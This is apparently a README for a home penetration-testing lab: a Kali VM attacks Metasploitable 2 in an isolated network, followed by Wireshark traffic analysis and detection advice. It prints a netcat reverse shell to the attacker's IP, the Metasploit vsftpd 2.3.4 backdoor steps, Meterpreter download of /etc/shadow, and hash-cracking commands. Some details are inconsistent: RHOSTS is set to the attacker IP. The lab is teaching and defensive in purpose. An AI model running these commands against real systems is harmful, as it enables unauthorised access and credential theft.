# Reverse Shell Lab - Offensive Security Home Lab

### Cybersecurity home lab simulating remote access attacks

- *Reverse Shell*
- *Traffic Analysis*
- *Exploitation*
- *Detection*


## LEGAL DISCLAIMER

The project was conducted entirely within an isolated, private virtual lab environment.

The attacks were performed on intentionally vulnerable machines (**Metasploitable 2**) that I own.

**Do not attempt these techniques on systems you don't have written permission to test.**

This project is for **educational purposes only**.

---

## Repo Structure
```
reverse-shell-lab/
├── README.md              
├── LICENSE                
├── .gitignore             
├── Reverse-Shell-Pentest-Report.docx    
├── docs/
│   ├── wireshark-analysis.md
│   └── github-setup.md
└── screenshots/
```
---

### Table of Contents

1. [Project Overview](#Project-Overview)
2. [Objectives](#Objectives)
3. [Lab Architecture](#Lab-Architecture)
4. [Tools and Technologies](#Tools-and-Technologies)
5. [Environment Setup](#Environment-Setup)

     - *VirtualBox Installation*
     - *Kali Linux VM Setup*
     - *Metasploitable 2 VM setup*
     - *Network Configuration*
  
6. [Attack Phase 1 - Manual Reverse Shell with Netcat](#Attack-Phase-1---Manual-Reverse-Shell-with-Netcat)
7. [Attack Phase 2 - Metasploit Exploitation](#Attack-Phase-2---Metasploit-Exploitation)
8. [Traffic Analysis with Wireshark](#Traffic-Analysis-with-Wireshark)
9. [Detection and Blue Team perspectives](#Detection-and-Blue-Team-Perspectives)
10. [Key Findings](#Key-Findings)
11. [Lessons Learned](#Lessons-Learned)
12. [Further Research and Next Steps](#Further-Research-and-Next-Steps)

---

## Project Overview

This project is a home lab that simulates how attackers establish unauthorized remote access to target systems using **reverse shells**. A reverse shell is a technique where **the target machine initiates a connection back to the attacker,** bypassing inbound firewall rules which is one of the most common dangerous techniques used by attackers.

In this lab I built the **entire attack chain** from scratch:

- Configured two virtual machines in an isolated network
- Manually crafted a reverse shell using Netcat
- Moved to a full Metasploit exploitation scenario
- Captured and analyzed all network traffic with Wireshark
- Documented what defenders can look for to detect such  attacks

The lab bridges gap between theory and real offensive security techniques used by pentesters and red teamers.

---

## Objectives

1. Understand what a reverse shell is and why attackers prefer it over bind shells
2. Set up isolated dual-VM lab environments well
3. Establish a manual reverse shell using Netcat
4. Exploit a real CVE using Metasploit Framework
5. Capture and interpret reverse shell traffic in Wireshark
6. Identify detection signatures for Blue Team awareness
7. Understand the full attack lifecycle (Reconnaissance --> Exploitation --> Post-Exploitation)

---

## Lab Architecture

     VIRTUALBOX HOST MACHINE

     ATTACKER VM                      

     Kali Linux
     IP: 192.168.56.6

     Tools:
      - Metasploit
      - Netcat
      - Wireshark
      - Nmap

     TARGET VM
     Metasploitable 2
     IP: 192.168.56.5

     Intentionally Vulnerable:
      - VSFTPD 2.3.4 backdoor
      - Samba mis-config
      - UnrealIRCd backdoor
      - PHP CGI exploit
       
     Host-Only Network: 192.168.56.0/24
    (ISOLATED ENVIRONMENT - No internet access)

**Host-Only-Network** --> in this lab we use this network mode because Host-Only adapter creates a completely isolated network between VMs. No traffic will escape to the internet which makes the lab safe and contained.

---

## Tools and Technologies

1. **VirtualBox** --> *Hypervisor/ VM platform (infrastructure)*
2. **Kali Linux** --> *Attacker operating system (offensive)*
3. **Metasploitable 2** --> *Intentionally vulnerable Linux VM (target)*
4. **Netcat (nc)** --> *Manual reverse shell establishment (exploitation)*
5. **Metasploit Framework (msfconsole)** --> *Exploit framework with Meterpreter (exploitation)*
6. **Wireshark** --> *Packet capture and traffic analysis (analysis)*
7. **Nmap** --> *Network scanning and service discovery (reconnaissance)*

---

## Environment Setup

**Step1: Install VirtualBox**

1. Download VirtualBox from their official website
2. Install the extension packs as well and verify the installation

**Step2: Set Up Kali Linux VM**
1. Download Kali linux from their official website
2. Download the **virtualBox pre-built image** (.ova or .vbox format)
3. Import into virtualbox:
   `File --> Import Appliance --> Select the .ova file --> Import`
4. put these VM settings:
   ```
      RAM 2048MB minimum ( >4096 recommended)
      2 CPU Cores
      128 MB Video Memory
      Enable Network Adapter 1  - Host-Only-Adapter
   ```
 *On first boot follow all the steps, and put the default credentials kali/kali*
 *Update the system:* `sudo apt update && sudo apt upgrade -y`

**Step 3: Set Up Metasploitable 2 VM**

- download from `SourceForge:Metasploitable`
- extract the `.zip` where you'll get a `.vmdk` disk file
- **Create the VM in VirtualBox:**
```
 New --> Name: "Metasploitable2"  --> Type:Linux --> Version: Ubuntu (32-bit)
 Memory: 1GB
 --> Use an existing Virtual hard disk --> Select the location of the `.vmdk` file
```
- **Network Settings**
 `Settings --> Network --> Adapter 1 --> Host-Only Adapter`

- **Boot and Verify**
  `Login: msfadmin / msfadmin`

**Step 4: Configure Host-Only Network**

*In the VirtualBox, set up Host-Only networks so that both VMs are on same isolated subnet:*

```
 File --> Host Network Manager --> Create
 IPV4 Address: 192.168.56.1
 IPV4 Mask:    255.255.255.0
 DHCP Server:  Enable
```

*Verify connectivity from Kali*

`ip addr show` - *check your kali IP*

`ping 192.168.56.5` - *ping Metasploitable*

*If the ping responds, the lab is ready*

---

## Attack Phase 1 - Manual Reverse Shell with Netcat

**What is a Reverse Shell?**

*In a **bind shell**, the attacker connects **to** the target (easy to block with firewalls)*.

*In a **reverse shell**, the target connects **back** to the attacker (bypasses most inbound firewall rules)*

*This is why reverse shells are widely used in real attacks.*

### Step 1: Reconnaissance - Nmap Scan

On **Kali VM**, scan the target to discover the open ports and services:
`nmap -sV -sC -O 192.168.56.5`

**Flag**       **Meaning**

**-sV** --> *Service version detection*

**-sC** --> *Run default NSE scripts*

**-O**  --> *OS detection*

![nmap-results](/screenshots/nmap1.png)

![nmap-results](/screenshots/nmap2.png)

![nmap-results](/screenshots/nmap3.png)

![nmap-results](/screenshots/nmap4.png)


**Findings:** VSFTPD 2.3.4 is flagged - the version has a famous backdoor (CVE-2011-2523).

### Step 2: Set Up the Netcat Listener (Attacker Side)

On **Kali Linux**, open a terminal and start listening on port 4444:

`nc -lvnp 4444`


**Flag**      **Meaning**

**-l**    -->  *Listen mode*

**-v**    -->  *Verbose output*

**-n**    -->  *No DNS resolution (faster)*

**-p**    -->  *Specify the port*


The terminal now waits for an incoming connection. This will be the 'catch' for the reverse shell.

### Step 3: Trigger the Reverse Shell (Target Side)

From the Metasploitable VM, run the following command to connect back to the Kali listener:

`nc 192.168.56.6 4444 -e /bin/sh`  
`# replace the IP with your actual IP`

**What this does:**

**nc** --> *Netcat, the networking protocol*

**192.168.56.6** --> *Attacker IP (kali) to connect back to*

**4444** --> *port the kali listener is waiting on*

**-e /bin/sh** --> *Execute /bin/sh and pipe all its I/O over the connection*

![metasploitable2-nc](/screenshots/Metasploitable2-nc)

*In simple words, what happens is that **Netcat** opens a TCP connection to **Kali** and hands over a **Shell** - every command typed on Kali runs on **Metasploitble**.


### Step 4: Verification of Shell Access
Back on Kali, Netcat listener should show:

```
listening on [any] 4444 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 54321
```

*The Metasploitable terminal shows a **blinking cursor** which is normal. The shell has no prompt because `/bin/sh` is minimal. All the interaction happens from the kali side.*

*This shows we have a remote shell on the target machine.*

*These commands run on attacker machine but gets executed on target machine:*

```
whoami ---> msfadmin
id ----> uid=1000(msfadmin) gid=1000(msfadmin)
hostname ----> metasploitable
cat /etc/passwd  -----> view all users on target system
uname -a -----> linux metasploitable 2.6.24-16-server
```

![netcat-listener](/screenshots/nc1.png)

![netcat-listener](/screenshots/nc2.png)

---

## Attack Phase 2 - Metasploit Exploitation

***Exploiting VSFTPD 2.3.4 Backdoor (CVE-2011-2523)***

**VSFTPd 2.3.4 contains a deliberate backdoor** --  when a username containing `:)` is sent, the daemon opens a shell on port 6200. It a real CVE.

- **Launnch Metasploit**: `msfconsole`

- **Find and configure the exploit:** *(run these commands step by step)*
```
# Search for the exploit
msf6 > search vsftpd

# Use it
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# Show required options
msf6 exploit(vsftpd_234_backdoor) > show options

# Set the target IP
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.6

# Run the exploit
msf6 exploit(vsftpd_234_backdoor) > run

```
![vsftpd](/screenshots/msf1.png)

*Throught this the root access would have been acheived via a single CVE*

- **Escalating to Meterpreter Shell**

*A meterpreter shell guves us far more capabilities than a plain shell*

![run & upgrade to meterpreter](/screenshots/msf6.png)

`sessions -u 1` --> *this upgrades the basic command shell from VSFTPd exploit into a full Meterpreter session*

`sessions -i 2` --> *Connects you into the newly created Meterpreter session. The `-i` stands for "interact". Session 1 was the basic shell, session 2 is the **upgraded Meterpreter***


- **These are the meterpreter capabilities used and what they do**

```
meterpreter > sysinfo           # System information
meterpreter > getuid            # Current user
meterpreter > ps                # List all processes
meterpreter > download /etc/shadow  # Download the shadow password file
meterpreter > shell             # Drop into a system shell

```

![meterpreter-capabilities](/screenshots/mptr1.png)

![meterpreter-capabilities](/screenshots/mptr2.png)

![meterpreter-shell](/screenshots/shl1.png)

`meterpreter > download /etc/shadow` --> *Downloads the shadow file directly from target machine to Kali machine, it demonstrates that Meterpreter can exfiltrate files silently which is a major threat in real situations.*

` meterpreter > shell` --> *From inside Meterpreter, this drops you into a raw system shell on the target. Useful when you need to run standard Linux commands directly. Type `exit` to return back to Meterpreter.*

`cat /etc/shadow` --> *Reads the shadow password file, which stores the hashed passwords of every user on the system. This file is normally readable by root - the fact that we can read it confirms we have full root access. These hashes could be cracked offline using tools like Hashcat or John the Ripper.*


![shell-meterpreter](/screenshots/shm2.png)

`meterpreter > run post/linux/gather/hashdump` --> *A built-in Metasploit post-exploitation module that dumps all system password hashes in a clean, formatted output.*

![cat-shadow](/screenshots/shad.png)

After downloading the `/etc/shadow` file to Kali using `meterpreter > download /etc/shadow`, I ran the following command directly on Kali to read it:
`cat ~/shadow`

This demonstrates something very important — the file is now off the target machine and sitting on the attacker's machine.

This is what real data exfiltration looks like. The attacker no longer needs any active connection to the target to read those password hashes — they have their own local copy.

From here a real attacker would feed this file straight into a password cracking tool:

`john --wordlist=/usr/share/wordlists/rockyou.txt ~/shadow`

or 

`hashcat -m 500 ~/shadow /usr/share/wordlists/rockyou.txt`

---
## Traffic Analysis with Wireshark

**Capturing the Attack Traffic**

Before starting any of the attacks, start wireshark  `sudo wireshark`

![wireshark](/screenshots/wshsto.png)

 - Select the active interface you use; example eth0, eth1
 - Start the capture
 - Run the reverse shell attack
 - Stop the capture

1. **The TCP Handshake**

The target initiates the connection to the attacker - this is the defining characteristic of a reverse shell.

![captured-packets](/screenshots/wsharkpkts.png)

2. **Shell Commands in Plaitext**

Apply this Wireshark filter: ` tcp.port == 4444`

Right-click the packet -> Follow -> TCP Stream

You'll then see the raw shell session:

*Plain Netcat shells send all data unencrypted. Every command and response is visible in the packet capture.*

![tcp-stream](/screenshots/wireshark1.png)

![tcp-stream2](/screenshots/wshark3cat.png)

![tcp-stream3](/screenshots/wireshark2.png)

3. **Traffic Analysis Filters Used**

   `tcp.port == 4444` --> Shows reverse shell traffic
   
   `tcp.flags.syn == 1` --> Shows all connection initiations
   
   `ip.src == 192.168.56.5` --> Traffic from target only
   
   `tcp.stream eq 0`  --> Follow specific TCP stream
   
   `frame contains "bash"` --> Find the packets with shell strings
   

![another-filter](/screenshots/wsharkfinal.png)

5. **VSFTPd Backdoor Traffic**
   
   (**Wireshark Evidence — CVE-2011-2523 (VSFTPd 2.3.4 Backdoor)**)

*To analyze the exploit traffic, I applied the following filter in Wireshark:*

   Filter: `tcp.port == 21 or tcp.port == 6200`

![wireshark-backdoor](/screenshots/new1.png)

**What the capture revealed on port 21:**

Following the TCP stream on port 21 showed exactly how the backdoor was triggered. Metasploit sent a username containing `:)` — specifically `0A:)` — during the FTP authentication

```
220 (vsFTPd 2.3.4)
USER 0A:)                  ← the :) triggers the backdoor
PASS HSjnV                 ← password is irrelevant
421 Timeout.               ← looks like failure but the damage is already done
```

The `:)` string in the username is the exact trigger built into VSFTPd 2.3.4's backdoor code. 

The moment that username was received by the server, it silently spawned a root shell on port 6200 — regardless of what password was sent or whether the FTP login even succeeded.



![wireshark-port](/screenshots/new2.png)

**What the capture revealed on port 6200:**

Filtering for `tcp.port == 6200` and following that TCP stream confirmed the backdoor shell was open and running as root — `uid=0(root)` — proving full system compromise via a single FTP authentication attempt.
The key takeaway: This is why version detection during reconnaissance matters so much. The Nmap scan immediately revealed `vsFTPd 2.3.4` — a version that has been publicly known to be backdoored since 2011. One banner, one searchsploit lookup, root access in seconds. Unpatched software is one of the most common and dangerous entry points in real-world attacks.

---

## Detection and Blue Team Perspective

*Here are some of the detection signatures defenders like SOC analysts would look for:*

1. Unusual Outbound Connections
```
Alert: Internal host initiating outbound connection to non-standard port
Rule: src=192.168.56.102, dst=192.168.56.101, dport=4444

```
2. Process Anomaly Detection
```
Suspicious: bash process with parent = apache/vsftpd
Normal parent: login, sshd, gnome-terminal
Red flag: bash spawned from network service

```
**Why are Reverse Shells Hard to Detect?**

- *It uses common ports like (80, 443) which blends well with web traffic*
- *There are encrypted variants (Open SSL) which hides content from IDS*
- *Outbound connections are often unrestricted which bypasses Firewalls*
- *It uses built-in OS tools like bash, nc, python*

**Recommended Mitigations**

- **Patch Management** - VSFTPd 2.3.4 CVE is from 2011, keep softwares updated
- **Network Segmentation** - limit which machines can initiate outbound connections
- **Log monitoring** - alert on shells spawned from no-interactive processes
- **Apply the principle of least privilege (PoLP)** - network services should not run as root

---

## **Key Findings**

| Finding                                              | Severity | CVE           |
|------------------------------------------------------|----------|---------------|
| VSFTPd 2.3.4 backdoor allows instant root shell      | Critical | CVE-2011-2523 |
| Netcat available on target enables manual shell      | High     | N/A           |
| Telnet service exposed (plaintext credentials)       | High     | N/A           |
| No firewall / egress filtering on target             | High     | N/A           |
| All reverse shell traffic transmitted unencrypted    | Medium   | N/A           |

---

## Lessons Learned

1. **Why Reverse Shells Bypass Firewalls**
   
Most firewall rules focus on inbound connections. A reverse shell exploits the fact that outbound connections are often unrestricted. This is why egress filtering is so critical — it's a widely overlooked defensive gap.

2. **The Danger of Unpatched Software**
   
VSFTPd 2.3.4 was backdoored in 2011 — over a decade ago. Metasploitable 2 still runs it, demonstrating how long unpatched vulnerabilities persist in real environments. A single unpatched service gave us root access in seconds.

3. **Plaintext Protocols Are Surveillance Gold**
   
Wireshark made it possible to read every command in the shell session. Modern attackers use encrypted reverse shells (e.g., openssl s_client) to evade this. This highlighted why encryption matters even in internal networks.

4. **Netcat**
   
Understanding Netcat's raw capabilities before jumping to Metasploit gave me a much deeper understanding for how shells work. Metasploit abstracts the complexity, but knowing what's happening at the TCP level is invaluable for both offense and defense.

6. **Offense Informs Defense**
   
Every attack technique I practiced immediately made me think: "How would I detect this? How would I prevent it?" The dual mindset of thinking like an attacker to build better defenses — is the core philosophy of modern security.


---

## Further Research and Next Steps

*This lab was a foundation, here are some of the steps that comes next:*

- Persistence Mechanisms — Study how attackers maintain access (cron jobs, systemd services, SSH keys)
- Intrusion Detection — Deploy Snort/Suricata and tune rules to detect the attacks in this lab
- Encrypted Reverse Shell — Implement OpenSSL-based reverse shell to evade Wireshark inspection
- Privilege Escalation Lab — Starting as low-priv user and escalating to root without pre-existing CVEs

---

## Resources and References

- [Metasploitable 2 Vulnerability Guide](https://docs.rapid7.com/metasploit/metasploitable-2)
- [Netcat Cheat Sheet - SANS](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)
- [CVE-2011-2523 - VSFTPd Backdoor](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)


---

## Author

**Cleveland Henry Lore**

*Cybersecurity Enthusiast*
